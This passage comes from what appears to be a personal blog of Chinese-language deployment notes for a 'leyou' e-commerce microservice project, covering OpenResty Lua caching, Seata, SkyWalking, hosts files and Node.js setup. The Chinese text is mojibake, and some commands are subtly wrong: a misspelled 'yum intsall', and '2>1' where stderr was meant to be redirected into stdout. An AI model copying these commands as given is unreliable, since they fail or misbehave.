å¸¸ç”¨å˜é‡å’Œæ–¹æ³•</span><br><span class="line">local ngx_log = ngx.log  </span><br><span class="line">local ngx_ERR = ngx.ERR  </span><br><span class="line">local ngx_exit = ngx.exit  </span><br><span class="line">local ngx_print = ngx.print  </span><br><span class="line">local ngx_re_match = ngx.re.match  </span><br><span class="line"></span><br><span class="line">-- è·å–å•†å“id</span><br><span class="line">local spuId = ngx.var.spuId</span><br><span class="line">-- è·å–spu</span><br><span class="line">local spuKey = &quot;page:spu:id:&quot;..spuId </span><br><span class="line">local spuInfoStr = read_redis(&quot;81.68.97.129&quot;, 6379, spuKey)  </span><br><span class="line">if not spuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found spu info, back to http, spuId : &quot;, spuId)  </span><br><span class="line">   spuInfoStr = read_http(&quot;/spu/&quot;..spuId, &#123;&#125;)  </span><br><span class="line">end  </span><br><span class="line">if not spuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found spuInfoStr info, spuId : &quot;, spuId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">-- è·å–sku</span><br><span class="line">local skuKey = &quot;page:sku:id:&quot;..spuId </span><br><span class="line">local skuInfoStr = read_redis(&quot;81.68.97.129&quot;, 6379, skuKey)  </span><br><span class="line">if not skuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found sku info, back to http, spuId : &quot;, spuId)  </span><br><span class="line">   skuInfoStr = read_http(&quot;/sku/&quot;..spuId, &#123;&#125;)  </span><br><span class="line">end  </span><br><span class="line">if not skuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found skuInfoStr info, spuId : &quot;, spuId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- è·å–spuDetail</span><br><span class="line">local detailKey = &quot;page:detail:id:&quot;..spuId </span><br><span class="line">local detailInfoStr = read_redis(&quot;81.68.97.129&quot;, 6379, detailKey)  </span><br><span class="line">if not detailInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found detail info, back to http, spuId : &quot;, spuId)  </span><br><span class="line">   detailInfoStr = read_http(&quot;/detail/&quot;..spuId, &#123;&#125;)  </span><br><span class="line">end  </span><br><span class="line">if not detailInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found detailInfoStr info, spuId : &quot;, spuId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- è·å–categories</span><br><span class="line">local spuInfo = cjson.decode(spuInfoStr)  </span><br><span class="line">local cid3 = spuInfo[&quot;categoryIds&quot;][3]</span><br><span class="line">local categoryKey = &quot;page:category:id:&quot;..cid3 </span><br><span class="line">local categoryStr = read_cache(&quot;81.68.97.129&quot;, 6379, categoryKey)  </span><br><span class="line">if not categoryStr then  </span><br><span class="line">   local idStr = table.concat(spuInfo[&quot;categoryIds&quot;],&quot;,&quot;);</span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found category info, back to http, categoryIds : &quot;, idStr)  </span><br><span class="line">   categoryStr = read_http(&quot;/categories/&quot;, &#123;ids  = idStr&#125;)</span><br><span class="line">end  </span><br><span class="line">if not categoryStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found categoryStr info, categoryId : &quot;, cid3)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- è·å–å“ç‰Œ  </span><br><span class="line">local brandId = spuInfo[&quot;brandId&quot;]</span><br><span class="line">local brandKey = &quot;page:brand:id:&quot;..brandId </span><br><span class="line">local brandStr = read_cache(&quot;81.68.97.129&quot;, 6379, brandKey)  </span><br><span class="line">if not brandStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found brand info, back to http, brandId : &quot;, brandId)  </span><br><span class="line">   brandStr = read_http(&quot;/brand/&quot;..brandId, &#123;&#125;)</span><br><span class="line">end  </span><br><span class="line">if not brandStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found brandStr info, brandId : &quot;, brandId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- è·å–è§„æ ¼</span><br><span class="line">local specKey = &quot;page:spec:id:&quot;..cid3 </span><br><span class="line">local specStr = read_cache(&quot;81.68.97.129&quot;, 6379, specKey)  </span><br><span class="line">if not specStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found spec info, back to http, cid3 : &quot;, cid3)  </span><br><span class="line">   specStr = read_http(&quot;/spec/&quot;..cid3, &#123;&#125;)</span><br><span class="line">end  </span><br><span class="line">if not specStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found specStr info, cid3 : &quot;, cid3)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- ç»„ç»‡æ•°æ®1</span><br><span class="line">local context = &#123;</span><br><span class="line">	name = spuInfo[&quot;name&quot;],</span><br><span class="line">	skuList =  skuInfoStr,</span><br><span class="line">	detail =  detailInfoStr,</span><br><span class="line">	categories =  categoryStr,</span><br><span class="line">	brand =  brandStr,</span><br><span class="line">	specs =  specStr</span><br><span class="line">&#125;</span><br><span class="line">--æ¸²æŸ“æ¨¡æ¿  1</span><br><span class="line">template.render(&quot;item.html&quot;, context)  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†item.htmlå¯¼å…¥åˆ°/usr/resty/templatesé‡Œé¢</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™ä¸ªé¡µé¢éœ€è¦ä»é—¨æˆ·æ‹¿jsæ–‡ä»¶</span></span><br><span class="line">vi /usr/resty/templates/item.html </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nginx -p /usr/resty/ -c conf/nginx.conf</span><br><span class="line"><span class="comment"># å…ˆå¯åŠ¨æ‰èƒ½reload</span></span><br><span class="line">nginx -p /usr/resty/ -c conf/nginx.conf -s reload</span><br><span class="line"><span class="comment">#å…¶ä¸­çš„-pä¸»è¦æ˜¯æŒ‡æ˜nginxå¯åŠ¨æ—¶çš„é…ç½®ç›®å½•ï¼›-cä¸º Nginx æŒ‡å®šä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¥ä»£æ›¿ç¼ºçœçš„ã€‚</span></span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…seata1-1-0"><a href="#å®‰è£…seata1-1-0" class="headerlink" title="å®‰è£…seata1.1.0"></a>å®‰è£…seata1.1.0</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/seata/seata/releases/download/v1.1.0/seata-server-1.1.0.tar.gz</span><br><span class="line">tar -zxvf seata-server-1.1.0.tar.gz</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹file.confå’Œregistry.conf</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">æ·»åŠ hosts 192.168.58.76 ly-registry</span><br><span class="line"><span class="comment">#å°†å®‰è£…åŒ…æ”¾åˆ°æ–‡ä»¶å¤¹ä¸­</span></span><br><span class="line"><span class="built_in">cd</span> seata/conf</span><br><span class="line">vi registry.conf</span><br><span class="line"></span><br><span class="line">registry &#123;</span><br><span class="line">  <span class="comment"># file ã€nacos ã€eurekaã€redisã€zkã€consulã€etcd3ã€sofa</span></span><br><span class="line">  <span class="built_in">type</span> = <span class="string">&quot;eureka&quot;</span></span><br><span class="line">  loadBalance = <span class="string">&quot;RandomLoadBalance&quot;</span></span><br><span class="line">  loadBalanceVirtualNodes = 10</span><br><span class="line">  eureka &#123;</span><br><span class="line">  	<span class="comment"># seata-server æ³¨å†Œåˆ°è¿™ä¸ªæ³¨å†Œä¸­å¿ƒ</span></span><br><span class="line">    serviceUrl = <span class="string">&quot;http://ly-registry:10086/eureka&quot;</span></span><br><span class="line">    <span class="comment"># seataâ€”server åœ¨æ³¨å†Œä¸­å¿ƒçš„åå­—</span></span><br><span class="line">    application = <span class="string">&quot;seata_service&quot;</span></span><br><span class="line">    weight = <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ä½¿ç”¨æ–‡ä»¶æ–¹å¼é…ç½®seata</span></span><br><span class="line">config &#123;</span><br><span class="line">  <span class="comment"># fileã€nacos ã€apolloã€zkã€consulã€etcd3</span></span><br><span class="line">  <span class="built_in">type</span> = <span class="string">&quot;file&quot;</span></span><br><span class="line">  file &#123;</span><br><span class="line">    name = <span class="string">&quot;file.conf&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi file.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">## transaction log store, only used in seata-server</span></span><br><span class="line">store &#123;</span><br><span class="line">  <span class="comment">## store mode: fileã€dbã€redis</span></span><br><span class="line">  mode = <span class="string">&quot;file&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## file store property</span></span><br><span class="line">  file &#123;</span><br><span class="line">    <span class="comment">## store location dir</span></span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;sessionStore&quot;</span></span><br><span class="line">    <span class="comment"># branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions</span></span><br><span class="line">    maxBranchSessionSize = 16384</span><br><span class="line">    <span class="comment"># globe session size , if exceeded throws exceptions</span></span><br><span class="line">    maxGlobalSessionSize = 512</span><br><span class="line">    <span class="comment"># file buffer size , if exceeded allocate new buffer</span></span><br><span class="line">    fileWriteBufferCacheSize = 16384</span><br><span class="line">    <span class="comment"># when recover batch read size</span></span><br><span class="line">    sessionReloadReadSize = 100</span><br><span class="line">    <span class="comment"># async, sync</span></span><br><span class="line">    flushDiskMode = async</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> seata/bin</span><br><span class="line"><span class="comment"># hä»£è¡¨åœ¨æ³¨å†Œä¸­å¿ƒæ³¨å†Œçš„åœ°å€ å‰å°è¿è¡Œ</span></span><br><span class="line">./seata-server.sh -h 192.168.58.201 -p 8091</span><br><span class="line"><span class="comment"># åå°è¿è¡Œ</span></span><br><span class="line"><span class="built_in">nohup</span> ./seata-server.sh -h 192.168.58.201 -p 8091 &gt;log.out 2&gt;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨mysqlä¸­å»ºè¡¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `undo_log` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `branch_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `xid` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `context` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `rollback_info` longblob <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `log_status` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `log_created` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `log_modified` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `ext` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE,</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `ux_undo_log` (`xid`,`branch_id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 ROW_FORMAT<span class="operator">=</span>COMPACT;</span><br></pre></td></tr></table></figure>

<h2 id="seataå’Œopenrestyè‡ªå¯åŠ¨è„šæœ¬"><a href="#seataå’Œopenrestyè‡ªå¯åŠ¨è„šæœ¬" class="headerlink" title="seataå’Œopenrestyè‡ªå¯åŠ¨è„šæœ¬"></a>seataå’Œopenrestyè‡ªå¯åŠ¨è„šæœ¬</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi leyou-start.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">/root/seata/bin/seata-server.sh -h 192.168.58.209 -p 8091 &gt;log.out 2&gt;1 &amp;</span><br><span class="line">nginx -p /usr/resty/ -c conf/nginx.conf</span><br><span class="line"></span><br><span class="line">chmod +x leyou-start.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¼€æœºè‡ªå¯åŠ¨-æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯¹nginxæ— æ•ˆ</span></span><br><span class="line">crontab -e</span><br><span class="line">@reboot /root/leyou-start.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¼€æœºè‡ªå¯åŠ¨-æ–¹æ³•äºŒ ä¸¤ä¸ªå‡æ— æ•ˆ</span></span><br><span class="line">vi /etc/rc.d/rc.local</span><br><span class="line">/root/leyou-start.sh </span><br></pre></td></tr></table></figure>

<h2 id="é…ç½®é“¾è·¯è¿½è¸ªskywalking-8"><a href="#é…ç½®é“¾è·¯è¿½è¸ªskywalking-8" class="headerlink" title="é…ç½®é“¾è·¯è¿½è¸ªskywalking 8"></a>é…ç½®é“¾è·¯è¿½è¸ªskywalking 8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">dockerå®‰è£…es7</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…jdk8</span></span><br><span class="line">yum install java-1.8.0-openjdk</span><br><span class="line"></span><br><span class="line">wget https://apache.claz.org/skywalking/8.6.0/apache-skywalking-apm-es7-8.6.0.tar.gz</span><br><span class="line">tar -zxvf apache-skywalking-apm-es7-8.6.0.tar.gz</span><br><span class="line">vi apache-skywalking-apm-bin-es7/config/application.yml </span><br><span class="line">é€‰æ‹©elasticsearch7ä¸ºå­˜å‚¨å¼•æ“ï¼Œç„¶åä¿®æ”¹ç´¢å¼•åï¼Œç„¶åè®¾ç½®esçš„ä½ç½®</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¡®ä¿å·²ç»å¯åŠ¨äº†es7ï¼Œä¸”é˜²ç«å¢™å·²ç»å…³é—­</span></span><br><span class="line">cd apache-skywalking-apm-bin-es7/bin/</span><br><span class="line">./startup.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç«¯å£8080</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/src/apache-skywalking-apm-bin/agent/skywalking-agent.jar</span><br></pre></td></tr></table></figure>

<p>Mac:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-registry</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-gateway</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-item-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-page-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-qurtz-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-sms-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-auth-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-search-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-trade-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-user-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br></pre></td></tr></table></figure>

<p>windows:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-registry</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-gateway</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-item-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-page-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-qurtz-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-sms-servcie</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-auth-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-search-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-trade-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-user-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br></pre></td></tr></table></figure>

<h2 id="centosæ ¡å‡†æ—¶é—´"><a href="#centosæ ¡å‡†æ—¶é—´" class="headerlink" title="centosæ ¡å‡†æ—¶é—´"></a>centosæ ¡å‡†æ—¶é—´</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// æ–¹æ¡ˆä¸€ æœ‰æ•ˆ</span><br><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">reboot</span><br><span class="line">// æ–¹æ¡ˆäºŒ</span><br><span class="line">yum -y install ntp</span><br><span class="line"><span class="meta">#</span><span class="language-bash">é€šè¿‡é˜¿é‡Œäº‘æ—¶é—´æœåŠ¡å™¨æ ¡å‡†æ—¶é—´</span></span><br><span class="line">ntpdate ntp1.aliyun.com</span><br></pre></td></tr></table></figure>

<h4 id="Centos-æ—¶åŒºå’Œdockeræ—¶åŒºé—®é¢˜å¯¼è‡´æ—¥å¿—è¢«åˆ é™¤"><a href="#Centos-æ—¶åŒºå’Œdockeræ—¶åŒºé—®é¢˜å¯¼è‡´æ—¥å¿—è¢«åˆ é™¤" class="headerlink" title="Centos æ—¶åŒºå’Œdockeræ—¶åŒºé—®é¢˜å¯¼è‡´æ—¥å¿—è¢«åˆ é™¤"></a>Centos æ—¶åŒºå’Œdockeræ—¶åŒºé—®é¢˜å¯¼è‡´æ—¥å¿—è¢«åˆ é™¤</h4><p>ä¿®æ”¹centosæ—¶é’Ÿ</p>
<p>ä¿®æ”¹dockeræ—¶åŒº</p>
<p>è¿˜æœ‰ideaçš„é—®é¢˜ï¼Œå¾—é‡å¯</p>
<p>è¿˜æœ‰docker ipv4çš„é—®é¢˜</p>
<p>è¿˜æœ‰graylog:9000å¯åŠ¨éœ€è¦æ—¶é—´ï¼Œä¸èƒ½ç«‹åˆ»è®¿é—®åˆ°,å¾—ç­‰ä¸€åˆ†é’Ÿ</p>
<p>æµªè´¹ä¸¤å¤©çš„æ—¶é—´</p>
<h4 id="dockerä¿®æ”¹æ—¶åŒº"><a href="#dockerä¿®æ”¹æ—¶åŒº" class="headerlink" title="dockerä¿®æ”¹æ—¶åŒº"></a>dockerä¿®æ”¹æ—¶åŒº</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥æ—¶åŒº</span></span><br><span class="line">docker exec 271629a4fb47 date</span><br><span class="line"></span><br><span class="line">-v /etc/localtime:/etc/localtime \</span><br><span class="line">-v /etc/timezone:/etc/timezone \</span><br></pre></td></tr></table></figure>

<h1 id="CentOS7"><a href="#CentOS7" class="headerlink" title="CentOS7"></a>CentOS7</h1><h2 id="å®‰è£…jdk8-1"><a href="#å®‰è£…jdk8-1" class="headerlink" title="å®‰è£…jdk8"></a>å®‰è£…jdk8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk</span><br></pre></td></tr></table></figure>

<h2 id="ä¿®æ”¹hosts"><a href="#ä¿®æ”¹hosts" class="headerlink" title="ä¿®æ”¹hosts"></a>ä¿®æ”¹hosts</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">106.14.29.182 ali-centos</span><br><span class="line">81.68.97.129 tx-centos</span><br><span class="line">192.168.58.162 mac-centos</span><br><span class="line">192.168.58.154 win-centos</span><br><span class="line"></span><br><span class="line">192.168.58.162 ly-gateway</span><br><span class="line">192.168.58.162 ly-registry</span><br><span class="line">192.168.58.154 ly-resty</span><br><span class="line">192.168.58.154 ly-mq</span><br><span class="line">192.168.58.154 ly-es</span><br><span class="line">192.168.58.154 ly-seata</span><br><span class="line">192.168.58.154 ly-mongo</span><br><span class="line">192.168.58.154 ly-redis</span><br><span class="line">192.168.58.154 ly-canal</span><br><span class="line">192.168.58.154 ly-mysql</span><br><span class="line"></span><br><span class="line">81.68.97.129 ly-skywalking</span><br><span class="line">106.14.29.182 ly-graylog</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨ç™¾åº¦æ™ºèƒ½äº‘ä¸Šä¿®æ”¹åŸŸåæ˜ å°„</span></span><br><span class="line">image.wl9939.top 192.168.58.162</span><br><span class="line">doc.wl9939.top 192.168.58.162</span><br><span class="line">api.wl9939.top 192.168.58.162</span><br><span class="line">registry.wl9939.top 192.168.58.162</span><br><span class="line">manage.wl9939.top 192.168.58.162</span><br><span class="line">www.wl9939.top 192.168.58.162</span><br><span class="line">centos.wl9939.top 192.168.58.154</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…gitä»¥åŠå¸¸ç”¨å‘½ä»¤"><a href="#å®‰è£…gitä»¥åŠå¸¸ç”¨å‘½ä»¤" class="headerlink" title="å®‰è£…gitä»¥åŠå¸¸ç”¨å‘½ä»¤"></a>å®‰è£…gitä»¥åŠå¸¸ç”¨å‘½ä»¤</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149306.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install git</span><br><span class="line"></span><br><span class="line">git clone https://github.com/HuangMingwang/leyou-manage.git</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ«æ”¾rootç›®å½•ä¸‹ï¼Œnginxå¯èƒ½æ²¡æœ‰æƒé™è®¿é—®</span></span><br><span class="line">git clone https://github.com/HuangMingwang/leyou-portal.git</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…Nodejs"><a href="#å®‰è£…Nodejs" class="headerlink" title="å®‰è£…Nodejs"></a>å®‰è£…Nodejs</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://nodejs.org/dist/v14.17.2/node-v14.17.2-linux-x64.tar.xz    # ä¸‹è½½</span><br><span class="line">tar xf node-v14.17.2-linux-x64.tar.xz                                 # è§£å‹</span><br><span class="line">cd node-v14.17.2-linux-x64                                             # è¿›å…¥è§£å‹ç›®å½•</span><br><span class="line">cp /etc/profile /etc/profile.bak</span><br><span class="line">vi /etc/profile</span><br><span class="line">export PATH=$PATH:/root/node-v14.17.2-linux-x64/bin</span><br><span class="line">source /etc/profile</span><br><span class="line">node -v</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org # ä½¿ç”¨æ·˜å®é•œåƒ</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…vue-cli-1"><a href="#å®‰è£…vue-cli-1" class="headerlink" title="å®‰è£…vue-cli"></a>å®‰è£…vue-cli</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cnpm install -g vue-cli</span><br></pre></td></tr></table></figure>

<h2 id="å°†é¡¹ç›®å¯¼å…¥"><a href="#å°†é¡¹ç›®å¯¼å…¥" class="headerlink" title="å°†é¡¹ç›®å¯¼å…¥"></a>å°†é¡¹ç›®å¯¼å…¥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ssh</span></span><br><span class="line">scp /Users/huangmingwang/Desktop/åŸºäºå¾®æœåŠ¡æ¶æ„çš„ç±»äº¬ä¸œç”µå•†å¹³å°/leyou/ssh.zip root@mac-centos:/opt/leyou</span><br><span class="line"><span class="meta">#</span><span class="language-bash">agent</span></span><br><span class="line">scp /Users/huangmingwang/Desktop/åŸºäºå¾®æœåŠ¡æ¶æ„çš„ç±»äº¬ä¸œç”µå•†å¹³å°/leyou/agent.zip root@mac-centos:/opt/leyou</span><br><span class="line"></span><br><span class="line">yum intsall unzip</span><br><span class="line">unzip ssh.zip</span><br><span class="line">unzip agent.zip</span><br><span class="line"></span><br><span class="line">cd /root/leyou/leyou-portal</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ‰§è¡Œé¡¹ç›®åˆå§‹åŒ–</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ‰§è¡Œvueçš„å®‰è£…</span></span><br><span class="line">npm install vue --save</span><br><span class="line"></span><br><span class="line">cd /opt/leyou/leyou-manage</span><br><span class="line">npm install</span><br><span class="line">nohup npm run serve &amp;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">leyou-manageæŠ¥é”™</span></span><br><span class="line">rm -rf node_modules</span><br><span class="line">npm install</span><br><span class="line">npm cache clean --force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

